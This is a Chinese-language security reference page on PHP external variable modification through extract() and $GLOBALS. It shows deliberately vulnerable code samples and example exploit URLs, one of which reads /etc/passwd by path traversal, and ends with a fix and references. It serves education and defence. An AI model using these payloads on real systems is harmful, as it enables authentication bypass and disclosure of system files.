# 外部变量修改

> 当Web应用程序未能正确处理用户输入时，可能会发生外部变量修改漏洞，允许攻击者覆盖内部变量。在PHP中，如果`extract($_GET)`、`extract($_POST)`或`import_request_variables()`等函数未经适当验证就将用户控制的数据导入全局范围，则可能被滥用。这可能导致安全问题，如未经授权的应用程序逻辑更改、权限提升或绕过安全控制。

## 概述

* [方法论](#方法论)
    * [覆盖关键变量](#覆盖关键变量)
    * [污染文件包含](#污染文件包含)
    * [全局变量注入](#全局变量注入)
* [修复措施](#修复措施)
* [参考文献](#参考文献)

## 方法论

PHP中的`extract()`函数从数组导入变量到当前符号表中。虽然它看起来很方便，但如果处理用户提供的数据时使用不当，可能会引入严重的安全风险。

* 它允许覆盖已存在的变量。
* 可能导致**变量污染**，影响安全机制。
* 可用作触发其他漏洞（如远程代码执行RCE和本地文件包含LFI）的**小工具**。

默认情况下，`extract()`使用`EXTR_OVERWRITE`，这意味着如果输入数组中的键与现有变量同名，则会**替换现有变量**。

### 覆盖关键变量

如果脚本中使用了`extract()`并依赖特定的变量，攻击者可以操纵这些变量。

```php
<?php
    $authenticated = false;
    extract($_GET);
    if ($authenticated) {
        echo "Access granted!";
    } else {
        echo "Access denied!";
    }
?>
```

**利用方式：**

在这个例子中，`extract($_GET)`的使用允许攻击者将`$authenticated`变量设置为`true`：

```ps1
http://example.com/vuln.php?authenticated=true
http://example.com/vuln.php?authenticated=1
```

### 污染文件包含

如果`extract()`与文件包含一起使用，攻击者可以控制文件路径。

```php
<?php
    $page = "config.php";
    extract($_GET);
    include "$page";
?>
```

**利用方式：**

```ps1
http://example.com/vuln.php?page=../../etc/passwd
```

### 全局变量注入

:warning: 自PHP 8.1.0起，不再支持对整个`$GLOBALS`数组的写访问。

当应用程序在不受信任的值上调用`extract`函数时覆盖`$GLOBALS`：

```php
extract($_GET);
```

攻击者可以操纵**全局变量**：

```ps1
http://example.com/vuln.php?GLOBALS[admin]=1
```

## 修复措施

使用`EXTR_SKIP`防止覆盖：

```php
extract($_GET, EXTR_SKIP);
```

## 参考文献

* [CWE-473: PHP外部变量修改 - 常见弱点枚举 - 2024年11月19日](https://cwe.mitre.org/data/definitions/473.html)
* [CWE-621: 变量提取错误 - 常见弱点枚举 - 2024年11月19日](https://cwe.mitre.org/data/definitions/621.html)
* [函数 extract - PHP文档 - 2001年3月21日](https://www.php.net/manual/en/function.extract.php)
* [`$GLOBALS`变量 - PHP文档 - 2008年4月30日](https://www.php.net/manual/en/reserved.variables.globals.php)
* [The Ducks - HackThisSite - 2016年12月14日](https://github.com/HackThisSite/CTF-Writeups/blob/master/2016/SCTF/Ducks/README.md)
* [Extracttheflag! - Orel / WindTeam - 2024年2月28日](https://ctftime.org/writeup/38076)